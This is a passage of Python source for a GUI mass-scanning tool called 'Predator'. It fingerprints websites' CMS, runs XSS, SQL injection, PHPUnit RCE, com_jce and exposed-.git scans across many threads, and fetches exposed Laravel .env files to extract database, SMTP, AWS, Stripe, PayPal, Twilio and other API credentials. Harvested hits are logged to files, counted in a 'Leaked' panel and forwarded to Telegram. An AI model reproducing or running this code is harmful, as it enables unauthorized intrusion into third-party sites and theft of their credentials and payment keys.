                consolelog("INFO", 'Idle.') 

                # self.apTargets.destroy()
               
                self.progress_bar.place(relx=0.3, rely=1.5)
                self.percentage_complete.place(relx=0.7, rely=1.5)
                self.eta_label.place(relx=0.25, rely=1.5)

                #show_info('info', 'Stop Event Done.')

                self.range_slider.place(relx=0.36, rely=0.9455, anchor=customtkinter.CENTER)
                self.thraeds_txt.place(relx=0.2, rely=0.9455, anchor=customtkinter.CENTER)

                self.tout_slider.place(relx=0.59, rely=0.9455, anchor=customtkinter.CENTER)
                self.tout_txt.place(relx=0.47, rely=0.9455, anchor=customtkinter.CENTER)
                
                try:
                    with open('core/txt/targets.txt', 'w', encoding="utf-8") as f:
                        f.write('')

                    with open('core/txt/targets.txt', 'a', encoding="utf-8") as o:
                        for trg in inScopeTargets:
                            o.write(f'{trg}')
                
                except Exception as err:
                    consolelog('INFO', err)
                
                self.auto_function()

        def env(target, endp):
            global envres
            global gdead
            global gtimeout
            global gstop

            if gstop == 'true':
                return

            try:
                url = target + endp

                GetConfig = requests.get(url, headers=HEADERS, timeout=gtimeout)

                if "Checking Browser" in GetConfig.text:
                    return False    
                elif GetConfig.status_code == 404:
                    return False
                elif GetConfig.status_code == 403:
                    return False
                else:
                    if "APP_NAME=" in GetConfig.text:
                        if "APP_ENV=" in GetConfig.text:
                            self.get_db(GetConfig.text)
                            self.get_smtp(GetConfig.text)
                            self.get_aws(GetConfig.text)
                            self.get_stripe(GetConfig.text)
                            self.get_razorpay(GetConfig.text)
                            self.get_skebby(GetConfig.text)
                            self.get_clickatell(GetConfig.text)
                            self.get_twilio(GetConfig.text)
                            self.get_plivo(GetConfig.text)
                            self.get_aruba(GetConfig.text)
                            self.get_nexmo(GetConfig.text)
                            self.get_paypal_sandbox(GetConfig.text)
                            self.get_paypal_live(GetConfig.text)
                            self.get_onesignal(GetConfig.text)
                            self.get_telnyx(GetConfig.text)
                            self.get_textlocal(GetConfig.text)
                            self.get_value_leaf(GetConfig.text)
                            self.get_sms(GetConfig.text)
                            self.get_openpay(GetConfig.text)
                            self.get_clicksend(GetConfig.text)
                            self.get_xgate(GetConfig.text)
                            self.get_aimon(GetConfig.text)

                            with open('Result/Laravel/Config.txt', 'a', encoding="utf-8") as f:
                                f.write(f"{url}\n")

                            self.send_to_telegram(f"🤗Config\n<code>{url}</code>") 
                            self.HitSound()
                            envres += 1
                            self.cfgbox.configure(text=f'Config: {envres}')

                            def copyConfig():
                                data = envtextbox.get("0.0", "end")
                                pyperclip.copy(data)
                                return self.show_checkmark('Success', 'Text copied to clipboard.')

                            def openConfig():
                                link = envtextbox.get("0.0", "end")
                                webbrowser.open(link, new=1, autoraise=True)

                            def deleteConfig():
                                envbtnsFrame.grid_forget()
                                envtextbox.grid_forget()
                                

                            envtextbox = customtkinter.CTkTextbox(self.envres_frame, corner_radius=0, height=30)
                            envtextbox.grid(row=envres, column=0, padx=10, sticky="nsew")
                            envtextbox.insert("0.0", f"{url}")

                            envbtnsFrame = customtkinter.CTkFrame(self.envres_frame, height=30, corner_radius=0)
                            envbtnsFrame.grid(row=envres, column=1, sticky="nsew")

                            envCopyResBtn = customtkinter.CTkButton(master=envbtnsFrame, text="Copy", command=copyConfig, width=50, border_width=0, fg_color="red", corner_radius=0)
                            envCopyResBtn.grid(row=0, column=0)
                            envOpenResBtn = customtkinter.CTkButton(master=envbtnsFrame, text="Open", command=openConfig, width=50, border_width=0, fg_color="red", corner_radius=0)
                            envOpenResBtn.grid(row=0, column=1)
                            envDeleteResBtn = customtkinter.CTkButton(master=envbtnsFrame, text="Delete", command=deleteConfig, width=50, border_width=0, fg_color="red", corner_radius=0)
                            envDeleteResBtn.grid(row=0, column=2)

                            self.auto_function()
                            self.Notif(f"Config: {envres}")
                            return True
                    else:        
                        return False

            except Exception as err:
                consolelog('INFO', err)

        def auto(url):
            global gstop

            if gstop == 'true':
                return
        
            try:         
                cms = serialize(url)
                
                if gstop == 'true':
                    return
            
                #OpenR2(url)
                
                #print(f"> CMS > ", cms['name'])
                if cms['name'] == 'WAF':
                    return consolelog("INFO", f'{url} > WAF Detected!')

                
                elif cms['name'] == 'DeadServer':
                    return consolelog("INFO", f'{url} > No Response!')
                    
        
                elif "Drupal" in cms['name']:   
                    consolelog("INFO", f'{url} > Drupal')

                    xss_value = self.getjson_data('xss')
                    if xss_value == 'on':
                        if self.drupxss_switch_var.get() == 'on':

                            if gstop == 'true':
                                return
                
                            consolelog("INFO", f'Scanning Drupal XSS [BruteForce] > {url}')
                            xssHunt(url)

                            if gstop == 'true':
                                return 
                            consolelog("INFO", f'Scanning Drupal XSS [Params] > {url}')
                            ParamsGrabber(url, 'XSS')
              

                    sql_value = self.getjson_data('sql')
                    if sql_value == 'on':
                        if self.drupsql_switch_var.get() == 'on':
                            if gstop == 'true':
                                return 
                            consolelog("INFO", f'Scanning Drupal SQL [Params] > {url}')
                            ParamsGrabber(url, 'SQL')
               

                               
                elif "osCommerce" in cms['name']:
                    consolelog("INFO", f'{url} > CMS > osCommerce')

                    xss_value = self.getjson_data('xss')
                    if xss_value == 'on':
                        if self.oscxss_switch_var.get() == 'on':
                            if gstop == 'true':
                                return

                            consolelog("INFO", f'Scanning osCommerce XSS [BruteForce] > {url}')
                            xssHunt(url)

                            if gstop == 'true':
                                return 
                            consolelog("INFO", f'Scanning osCommerce XSS [Params] > {url}')
                            ParamsGrabber(url, 'XSS')


                    if self.oscsql_switch_var.get() == 'on':
                        if gstop == 'true':
                            return
                        consolelog("INFO", f'Scanning osCommerce SQL [Params] > {url}')
                        ParamsGrabber(url, 'SQL')
             
                elif "vBulletin" in cms['name']:
                    
                    consolelog("INFO", f'{url} > CMS > vBulletin')

                    xss_value = self.getjson_data('xss')
                    if xss_value == 'on':
                        if self.vbxss_switch_var.get() == 'on':
                            if gstop == 'true':
                                return 
                            
                            consolelog("INFO", f'Scanning vBulletin XSS [BruteForce] > {url}')
                            xssHunt(url)  

                            if gstop == 'true':
                                return 

                            consolelog("INFO", f'Scanning vBulletin XSS [Params] > {url}')
                            ParamsGrabber(url, 'XSS')

                    sql_value = self.getjson_data('sql')
                    if sql_value == 'on':
                        if self.vbsql_switch_var.get() == 'on':
                            if gstop == 'true':
                                return 
                            consolelog("INFO", f'Scanning vBulletin SQL [Params] > {url}')
                            ParamsGrabber(url, 'SQL')
                    
                 

                elif "Prestashop" in cms['name']:
                    print(f"> CMS > Prestashop")
                    consolelog("INFO", f'{url} > CMS > Prestashop')

                    xss_value = self.getjson_data('xss')
                    if xss_value == 'on':
                        if self.presxss_switch_var.get() == 'on':
                            if gstop == 'true':
                                return
                            consolelog("INFO", f'Scanning Prestashop XSS [BruteForce] > {url}')
                            xssHunt(url)

                            if gstop == 'true':
                                return
                            consolelog("INFO", f'Scanning Prestashop XSS [Params] > {url}')
                            ParamsGrabber(url, 'XSS')
            
                    sql_value = self.getjson_data('sql')
                    if sql_value == 'on':
                        if self.pressql_switch_var.get() == 'on':
                            if gstop == 'true':
                                return
                            ParamsGrabber(url, 'SQL')
                    

                elif "Wordpress" in cms['name']:
                    consolelog("INFO", f'{url} > CMS > Wordpress')

                    git_value = self.getjson_data('git')
                    if git_value == 'on':
                        if self.wpgit_switch_var.get() == 'on':
                            if gstop == 'true':
                                return
                            consolelog("INFO", f'Scanning GIT > {url}/wp-content/themes/.git/config')
                            checkGit(url, '/wp-content/themes/.git/config')

                    xss_value = self.getjson_data('xss')
                    if xss_value == 'on':
                        if self.wpxss_switch_var.get() == 'on':
                            if gstop == 'true':
                                return
                            consolelog("INFO", f'Scanning WP XSS [BruteForce] > {url}')
                            xssHunt(url)


                        if gstop == 'true':
                            return
                        consolelog("INFO", f'Scanning WP XSS [Params] > {url}')
                        ParamsGrabber(url, 'XSS')
                 

                    sql_value = self.getjson_data('sql')
                    if sql_value == 'on':
                        if self.wpsql_switch_var.get() == 'on':
                            if gstop == 'true':
                                return
                            consolelog("INFO", f'Scanning WP SQL [Params] > {url}')
                            ParamsGrabber(url, 'SQL')
                    
                    
                
                elif "Joomla" in cms['name']:
                    consolelog("INFO", f'{url} > CMS > Joomla')

                    xss_value = self.getjson_data('xss')
                    if xss_value == 'on':
                        if self.jooxss_switch_var.get() == 'on':
                            if gstop == 'true':
                                return 
                            consolelog("INFO", f'Scanning Joomla XSS [BruteForce] > {url}')
                            xssHunt(url)

                            if gstop == 'true':
                                return

                            consolelog("INFO", f'Scanning Joomla XSS [Params] > {url}')
                            ParamsGrabber(url, 'XSS')
                     
                    sql_value = self.getjson_data('sql')
                    if sql_value == 'on':
                        if self.joosql_switch_var.get() == 'on':
                            if gstop == 'true':
                                return
                            consolelog("INFO", f'Scanning SQL [Params] > {url}')
                            ParamsGrabber(url, 'SQL')

                    comJce_value = self.getjson_data('com_jce')
                    if comJce_value == 'on':
                        if self.joocom_jce_switch_var.get() == 'on':
                            if gstop == 'true':
                                return
                            consolelog("INFO", f'Scanning com_jce > {url}')
                            com_jce(url)

                else:
                    consolelog("INFO", f'{url} > CMS > Other')

                    git_value = self.getjson_data('git')

                    if git_value == 'on':
                        if self.othergit_switch_var.get() == 'on':
                            if gstop == 'true':
                                return
                            consolelog("INFO", f'Scanning GIT > {url}/.git/config')
                            checkGit(url, '/.git/config')

                    phpu_value = self.getjson_data('phpunitrce')
                    if phpu_value == 'on':
                        if self.lrvlpur_switch_var.get() == 'on':
                            if gstop == 'true':
                                return
                            consolelog("INFO", f'Scanning PHPUnitRCE > {url}')
                            PHPUnitRCE(url)

                    cfg_value = self.getjson_data('config')
                    if cfg_value == 'on':
                        if self.lrvlenv_switch_var.get() == 'on':
                            if gstop == 'true':
                                return  
                            
                            consolelog("INFO", f'Scanning Config > {url}/.env')
                            if not env(url, '/.env'):
                                if gstop == 'true':
                                    return

                                if not env(url, '/prod/.env'):
                                    pass
                                # if gstop == 'true':
                                #     return
                                # if not env(url, '/.env.save'):
                                #     if gstop == 'true':
                                #         return
                                #     if not env(url, '/.env.php'):
                                #         if gstop == 'true':
                                #             return
                                #     if not env(url, '/beta/.env'):
                                #         if gstop == 'true':
                                #             return
                                #         
                                #             env(url, '/core/.env')


                    xss_value = self.getjson_data('xss')
                    if xss_value == 'on':
                        if self.otherxss_switch_var.get() == 'on':
                            if gstop == 'true':
                                return

                            consolelog('INFO', f'Scanning XSS [BruteForce] > {url}')
                            xssHunt(url)

                            if gstop == 'true':
                                return

                            consolelog('INFO', f'Scanning XSS [Params] > {url}')
                            ParamsGrabber(url, 'XSS')


                    sql_value = self.getjson_data('sql')
                    if sql_value == 'on':
                        if self.othersql_switch_var.get() == 'on':
                            if gstop == 'true':
                                return

                            consolelog('INFO', f'Scanning SQL [Params] > {url}')
                            ParamsGrabber(url, 'SQL')
            

            except Exception as err:
                return consolelog('ERROR', err)

        def LoopFix():
            global gstop
            global limitx
            global inScopeTargets

            limitx += 1
            # targetx = choice(inScopeTargets)
            # target = targetx.replace('\n', '')

            target = rand_target()
            if target == None:
                time.sleep(3)
                return LoopFix()

            if target == 'Stop':
                return stopshit()

            if len(target) > 1:
                pass
            else:
                # inScopeTargets.remove(targetx)
                remove_target(target)
                # self.InscoTargets.remove(f"{target}")
                
                return LoopFix()
            
            targettmp2 = target.replace('https://', '').replace('http://', '')
            targettmp1 = re.findall(r"(.*?)/", targettmp2)

            if str(targettmp1) != '[]':
                
                targetf = targettmp1[0]
            else:
                targetf = targettmp2

            ptarget = f'{protocol}{targetf}'

            if ptarget == 'http://' or ptarget == 'https://' or ptarget == 'http://www.' or ptarget == 'https://www.' or ptarget == '':
                return self.show_error('Error!', 'Invalid Targets')
            
            if gstop == 'true':
                return stopshit()
                  
            consolelog('INFO', f'InScope > {ptarget}')
            

            ptarget = ptarget.lower()
            try:
                auto(ptarget)
            except:
                pass
            
            remove_target(target)
            # self.InscoTargets.remove(f"{target}")

            x65x = len(inScopeTargets)

            if x65x > 999999:
                x65x = "+999999"
  
            self.updateProgress()
            if gstop == 'true':
                return stopshit()

            LoopFix()

        def start_scan():
            global gstop
            global threadingvalue

            xbots = int(threadingvalue)

            if gstop == 'true':
                return stopshit()

            # self.InscoTargets = []

            for bot in range(xbots):
                th = threading.Thread(target=LoopFix)
                th.daemon = True
                th.start()

        self.WindowWidth = 1200
        self.WindowHeigth = 655

        self.spawn_x = int((self.winfo_screenwidth()-self.WindowWidth)/2)
        self.spawn_y = int((self.winfo_screenheight()-self.WindowHeigth)/2)    
            
        # configure window
        self.title("Predator v0.0.8")        
        self.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.wm_iconphoto(False, mainico) 
        self.geometry(f"{self.WindowWidth}x{self.WindowHeigth}+{self.spawn_x}+{self.spawn_y}")
        self.protocol("WM_DELETE_WINDOW", self.on_closing)
        # self.minsize(1200, 655)
        # self.bind('<Configure>', self.print_width)

        # configure grid layout (4x4)
        self.grid_columnconfigure(2, weight=1)
        self.grid_rowconfigure((1,2,3), weight=1)

        revip_bots = self.settings_db('get', 'RevIpBots', '')
        subf_bots = self.settings_db('get', 'SubfBots', '')
        threadingvalue = self.settings_db('get', 'threads', '')
        gtimeout=self.settings_db('get', 'timeout', '')
        
        consolelog('INFO', "Copyright 2023 Predator. All rights reserved")

        # self.progress_frame = customtkinter.CTkFrame(self, width=120, corner_radius=0, fg_color="transparent")
        # self.progress_frame.grid(row=2, column=1, columnspan=2, sticky="nsew")
        # self.progress_frame.grid_rowconfigure(0, weight=1)
        # self.progress_frame.grid_columnconfigure((0,1), weight=1)

        self.progress_bar = customtkinter.CTkProgressBar(self, width=400, progress_color='green', orientation="horizontal", mode="determinate")
        self.progress_bar.place(relx=0.3, rely=1.5)
        self.progress_bar.set(0)
        self.percentage_complete = customtkinter.CTkLabel(self, text="0%", fg_color="transparent")
        self.percentage_complete.place(relx=0.7, rely=1.5)

        self.eta_label = customtkinter.CTkLabel(self, text="Time Left: 00:00:00", fg_color="transparent")
        self.eta_label.place(relx=0.25, rely=1.5)

        self.sidebar_frame = customtkinter.CTkFrame(self, width=120, corner_radius=0, fg_color="transparent")
        self.sidebar_frame.grid(row=0, column=0, rowspan=4, sticky="nsew")
        self.sidebar_frame.grid_rowconfigure((0,1,2), weight=1)
        self.sidebar_frame.grid_columnconfigure(0, weight=1)

        self.resscrollable_frame = customtkinter.CTkScrollableFrame(self.sidebar_frame, label_text="Result", width=130)
        self.resscrollable_frame.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")
        self.resscrollable_frame.grid_rowconfigure(0, weight=1)
        self.resscrollable_frame.grid_columnconfigure(0, weight=1)
        # self.resscrollable_frame.grid_columnconfigure(0, weight=1)

        sql_value = self.getjson_data('sql')
        xss_value = self.getjson_data('xss')
        phpu_value = self.getjson_data('phpunitrce')
        cors_value = self.getjson_data('cors')
        cfg_value = self.getjson_data('config')
        ap_value = self.getjson_data('apikeys')
        git_value = self.getjson_data('git')
        comJce_value = self.getjson_data('com_jce')
 

        if sql_value == "on":
            self.sqlbox = customtkinter.CTkLabel(self.resscrollable_frame, text='', fg_color="transparent")
            self.sqlbox.grid(row=0, column=0, sticky="nsew")
            self.sqlbox.configure(text=f'SQL: {sqlres}')

        if xss_value == "on":
            self.xssbox = customtkinter.CTkLabel(self.resscrollable_frame, text='', fg_color="transparent")
            self.xssbox.grid(row=1, column=0, sticky="nsew")
            self.xssbox.configure(text=f'XSS: {xssres}')

        if cors_value == "on":
            self.corsbox = customtkinter.CTkLabel(self.resscrollable_frame, text="", fg_color="transparent")
            self.corsbox.grid(row=2, column=0, sticky="nsew")
            self.corsbox.configure(text=f'CORS: {cors_res}')
        
        if cfg_value == "on":
            self.cfgbox = customtkinter.CTkLabel(self.resscrollable_frame, text='', fg_color="transparent")
            self.cfgbox.grid(row=3, column=0, sticky="nsew")
            self.cfgbox.configure(text=f'Config: {envres}')

        if git_value == "on":
            self.gitbox = customtkinter.CTkLabel(self.resscrollable_frame, text='', fg_color="transparent")
            self.gitbox.grid(row=4, column=0, sticky="nsew")
            self.gitbox.configure(text=f'GIT: {gitres}')

        if phpu_value == "on":
            self.phpubox = customtkinter.CTkLabel(self.resscrollable_frame, text="", fg_color="transparent")
            self.phpubox.grid(row=5, column=0, sticky="nsew")
            self.phpubox.configure(text=f'PHPUnitRCE: {PhpUnitRCE}')

        if comJce_value == "on":
            self.com_jcebox = customtkinter.CTkLabel(self.resscrollable_frame, text="", fg_color="transparent")
            self.com_jcebox.grid(row=6, column=0, sticky="nsew")
            self.com_jcebox.configure(text=f'com_jce: {comJceres}')

        self.leaked_frame = customtkinter.CTkScrollableFrame(self.sidebar_frame, label_text="Leaked", width=130)
        # self.leaked_frame.place(relx=1.5, rely=0.5, anchor=customtkinter.CENTER)
        self.leaked_frame.grid(row=1, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")
        # self.leaked_frame.grid_columnconfigure(0, weight=1)
        self.leaked_frame_switches = []

        self.dbs_res = customtkinter.CTkButton(master=self.leaked_frame, height=10, text=f"DBs: {TotalDBsHits}", border_width=0, command=self.getDBList)
        self.dbs_res.grid(row=0, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.dbs_res)

        self.smtp_res = customtkinter.CTkButton(master=self.leaked_frame, height=10, text=f"SMTP: {TotalSmtpsHits}", border_width=0, command=self.getSmtpList)

        self.smtp_res.grid(row=1, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.leaked_frame)

        self.twilio_res = customtkinter.CTkButton(master=self.leaked_frame, width=80, height=10, text=f"Twilio: {TotalTwilioHits}", border_width=0, command=self.getTwilioList)
        self.twilio_res.grid(row=2, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.twilio_res)

        self.sms_res = customtkinter.CTkButton(master=self.leaked_frame, width=80, height=10, text=f"SMS: {TotalSmsHits}", border_width=0, command=self.getSmsList)
        self.sms_res.grid(row=3, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.sms_res)

        self.aws_res = customtkinter.CTkButton(master=self.leaked_frame, width=80, height=10, text=f"AWS: {TotalAwsHits}", border_width=0, command=self.getAwsList)
        self.aws_res.grid(row=4, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.aws_res)

        self.stripe_res = customtkinter.CTkButton(master=self.leaked_frame, width=80, height=10, text=f"Stripe: {TotalStripeHits}", border_width=0, command=self.getStripeList)
        self.stripe_res.grid(row=5, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.stripe_res)

        self.clicksend_res = customtkinter.CTkButton(master=self.leaked_frame, width=80, height=10, text=f"ClickSend: {TotalClicksendHits}", border_width=0, command=self.getCsList)
        self.clicksend_res.grid(row=6, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.clicksend_res)

        self.OneSignal_res = customtkinter.CTkButton(master=self.leaked_frame, width=80, height=10, text=f"OneSignal: {TotalOsHits}", border_width=0, command=self.getOsList)
        self.OneSignal_res.grid(row=7, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.OneSignal_res)

        self.RazorPay_res = customtkinter.CTkButton(master=self.leaked_frame, width=80, height=10, text=f"RazorPay: {TotalRazorpayHits}", border_width=0, command=self.getRazorPayList)
        self.RazorPay_res.grid(row=8, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.RazorPay_res)

        self.PaypalLive_res = customtkinter.CTkButton(master=self.leaked_frame, width=80, height=10, text=f"PP Live: {TotalpaypalLHits}", border_width=0, command=self.getPaypalLiveList)
        self.PaypalLive_res.grid(row=9, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.PaypalLive_res) 

        self.PaypalS_res = customtkinter.CTkButton(master=self.leaked_frame, width=80, height=10, text=f"PP Sandbox: {TotalpaypalSHits}", border_width=0, command=self.getPaypalSList)
        self.PaypalS_res.grid(row=10, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        self.leaked_frame_switches.append(self.PaypalS_res)         

        self.AiBtn = customtkinter.CTkLabel(self.sidebar_frame, image=ai_icon, text='', fg_color="transparent")
        # self.AiBtn.grid(row=6, column=0, padx=20, pady=(10, 10))
        self.AiBtn.grid(row=2, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")
        self.AiBtn.bind("<Button-1>", lambda e:self.GPTj_trigger())

        self.appearance_mode_optionemenu = customtkinter.CTkOptionMenu(self.sidebar_frame, values=["Light", "Dark", "System"], command=self.change_appearance_mode_event)
        self.appearance_mode_optionemenu.grid(row=3, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")
        self.appearance_mode_optionemenu.set(DefaultTheme)

        self.range_slider = customtkinter.CTkSlider(master=self, from_=1, to=100, command=self.show_value)
        self.range_slider.place(relx=0.32, rely=0.955, anchor=customtkinter.CENTER)
        self.range_slider.set(threadingvalue)

        self.thraeds_txt = customtkinter.CTkLabel(master=self, text=f"Threads: {threadingvalue}", fg_color="transparent")
        self.thraeds_txt.place(relx=0.2, rely=0.955, anchor=customtkinter.CENTER)

        self.tout_slider = customtkinter.CTkSlider(master=self, from_=1, to=200, command=self.show_tvalue, width=200)
        self.tout_slider.place(relx=0.59, rely=0.955, anchor=customtkinter.CENTER)
        self.tout_slider.set(gtimeout)

        self.tout_txt = customtkinter.CTkLabel(master=self, text=f"Timeout: {gtimeout}", fg_color="transparent")
        self.tout_txt.place(relx=0.47, rely=0.955, anchor=customtkinter.CENTER)
        
        self.MainLogo = customtkinter.CTkFrame(self, corner_radius=6, fg_color="transparent")
        self.MainLogo.grid(row=0, column=1)
        self.MainLogo.grid_rowconfigure((0,1,2), weight=1)

        self.frameCnt = 30
        self.frames = [ImageTk.PhotoImage(file="core/logo.gif", format="gif -index %i" % (i)) for i in range(31)]

        def updateGIF(ind):
            frame = self.frames[ind]
            ind += 1
            if ind == self.frameCnt:
                ind = 0

            self.image_label.configure(image=frame)
            time.sleep(0.1)
            updateGIF(ind)

        # App Logo
        self.image_label = customtkinter.CTkLabel(self.MainLogo, image=app_logo, text='', fg_color="transparent")
        self.image_label.grid(row=0, column=0)

        self.TargetsCount = customtkinter.CTkButton(master=self.MainLogo, height=10, border_width=0)
        # self.TargetsCount.place(relx=0.255, rely=0.4, anchor=customtkinter.CENTER)
        self.TargetsCount.grid(row=1, column=0)
  
        self.IconsFrame = customtkinter.CTkFrame(self.MainLogo, fg_color="transparent")
        self.IconsFrame.grid(row=2, column=0, padx=(2, 2), pady=(10, 0),)
        self.IconsFrame.grid_rowconfigure(0, weight=1)
        self.IconsFrame.grid_columnconfigure((0,1,2,3,4), weight=1)

        self.rFolderBtn = customtkinter.CTkLabel(self.IconsFrame, image=folder_icon, text='', fg_color="transparent")
        self.rFolderBtn.grid(row=0, column=0)
        self.rFolderBtn.bind("<Button-1>", lambda e:self.open_rfolder())        

        self.donateBtn = customtkinter.CTkLabel(self.IconsFrame, image=donate_icon, text='', fg_color="transparent")
        self.donateBtn.grid(row=0, column=1)
        self.donateBtn.bind("<Button-1>", lambda e:self.donate_win())

        self.ThemeBtn = customtkinter.CTkLabel(self.IconsFrame, image=theme_icon, text='', fg_color="transparent")
        self.ThemeBtn.grid(row=0, column=2)
        self.ThemeBtn.bind("<Button-1>", lambda e:self.change_theme(0))

        self.SettingsBtn = customtkinter.CTkLabel(self.IconsFrame, image=settings_icon, text='', fg_color="transparent")
        self.SettingsBtn.grid(row=0, column=3)
        self.SettingsBtn.bind("<Button-1>", lambda e:self.settings_win())
        
        self.XRfFrame = customtkinter.CTkFrame(self, fg_color="transparent", corner_radius=6)
        self.XRfFrame.grid(row=0, column=2, rowspan=3, padx=(5, 5), pady=(5, 5), sticky="nsew")
        self.XRfFrame.grid_columnconfigure(0, weight=1)
        self.XRfFrame.grid_rowconfigure((0,1), weight=1)

        # create tabview
        self.tabview = customtkinter.CTkTabview(self.XRfFrame, corner_radius=6)
        self.tabview.grid(row=0, column=0, sticky="nsew")
        self.tabview.add("Wordpress").grid_columnconfigure((0,1,2), weight=1)
        self.tabview.add("Joomla").grid_columnconfigure((0,1,2), weight=1)
        self.tabview.add("Prestashop").grid_columnconfigure((0,1,2), weight=1)
        self.tabview.add("Drupal").grid_columnconfigure((0,1,2), weight=1)
        self.tabview.add("osCommerce").grid_columnconfigure((0,1,2), weight=1)
        self.tabview.add("vBulletin").grid_columnconfigure((0,1,2), weight=1)
        self.tabview.add("Laravel").grid_columnconfigure((0,1,2), weight=1)
        self.tabview.add("Other").grid_columnconfigure((0,1,2), weight=1)
        self.tabview.tab("Wordpress").grid_columnconfigure((0,1,2), weight=1)
        self.tabview.tab("Joomla").grid_columnconfigure((0,1,2), weight=1)

        sql_value = self.getjson_data('sql')
        xss_value = self.getjson_data('xss')
        phpu_value = self.getjson_data('phpunitrce')
        cors_value = self.getjson_data('cors')
        cfg_value = self.getjson_data('config')
        ap_value = self.getjson_data('apikeys')
        git_value = self.getjson_data('git')
        com_Jce_value = self.getjson_data('com_jce')
        
        self.wpsql_switch_var = customtkinter.StringVar(value=sql_value)
        self.wpsql_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Wordpress"), text=f"SQL", variable=self.wpsql_switch_var, onvalue="on", offvalue="off")
        self.wpsql_switch.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.wpxss_switch_var = customtkinter.StringVar(value=xss_value)
        self.wpxss_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Wordpress"), text=f"XSS", variable=self.wpxss_switch_var, onvalue="on", offvalue="off")
        self.wpxss_switch.grid(row=0, column=1, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.wpgit_switch_var = customtkinter.StringVar(value=git_value)
        self.wpgit_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Wordpress"), text=f"GIT", variable=self.wpgit_switch_var, onvalue="on", offvalue="off")
        self.wpgit_switch.grid(row=0, column=2, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.joosql_switch_var = customtkinter.StringVar(value=sql_value)
        self.joo_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Joomla"), text=f"SQL", variable=self.joosql_switch_var, onvalue="on", offvalue="off")
        self.joo_switch.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.jooxss_switch_var = customtkinter.StringVar(value=xss_value)
        self.jooxssswitch = customtkinter.CTkSwitch(master=self.tabview.tab("Joomla"), text=f"XSS", variable=self.jooxss_switch_var, onvalue="on", offvalue="off")
        self.jooxssswitch.grid(row=0, column=1, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.joocom_jce_switch_var = customtkinter.StringVar(value=com_Jce_value)
        self.joocom_jce_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Joomla"), text=f"com_jce", variable=self.joocom_jce_switch_var, onvalue="on", offvalue="off")
        self.joocom_jce_switch.grid(row=0, column=2, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.pressql_switch_var = customtkinter.StringVar(value=sql_value)
        self.pres_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Prestashop"), text=f"SQL", variable=self.pressql_switch_var, onvalue="on", offvalue="off")
        self.pres_switch.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.presxss_switch_var = customtkinter.StringVar(value=xss_value)
        self.presxx_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Prestashop"), text=f"XSS", variable=self.presxss_switch_var, onvalue="on", offvalue="off")
        self.presxx_switch.grid(row=0, column=1, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.drupsql_switch_var = customtkinter.StringVar(value=sql_value)
        self.drupsql_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Drupal"), text=f"SQL", variable=self.drupsql_switch_var, onvalue="on", offvalue="off")
        self.drupsql_switch.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.drupxss_switch_var = customtkinter.StringVar(value=xss_value)
        self.drupxss_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Drupal"), text=f"XSS", variable=self.drupxss_switch_var, onvalue="on", offvalue="off")
        self.drupxss_switch.grid(row=0, column=1, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.oscsql_switch_var = customtkinter.StringVar(value=sql_value)
        self.oscsql_switch = customtkinter.CTkSwitch(master=self.tabview.tab("osCommerce"), text=f"SQL", variable=self.oscsql_switch_var, onvalue="on", offvalue="off")
        self.oscsql_switch.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.oscxss_switch_var = customtkinter.StringVar(value=xss_value)
        self.oscxss_switch = customtkinter.CTkSwitch(master=self.tabview.tab("osCommerce"), text=f"XSS", variable=self.oscxss_switch_var, onvalue="on", offvalue="off")
        self.oscxss_switch.grid(row=0, column=1, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.vbsql_switch_var = customtkinter.StringVar(value=sql_value)
        self.vbsql_switch = customtkinter.CTkSwitch(master=self.tabview.tab("vBulletin"), text=f"SQL", variable=self.vbsql_switch_var, onvalue="on", offvalue="off")
        self.vbsql_switch.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.vbxss_switch_var = customtkinter.StringVar(value=xss_value)
        self.vbxss_switch = customtkinter.CTkSwitch(master=self.tabview.tab("vBulletin"), text=f"XSS", variable=self.vbxss_switch_var, onvalue="on", offvalue="off")
        self.vbxss_switch.grid(row=0, column=1, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.lrvlenv_switch_var = customtkinter.StringVar(value=cfg_value)
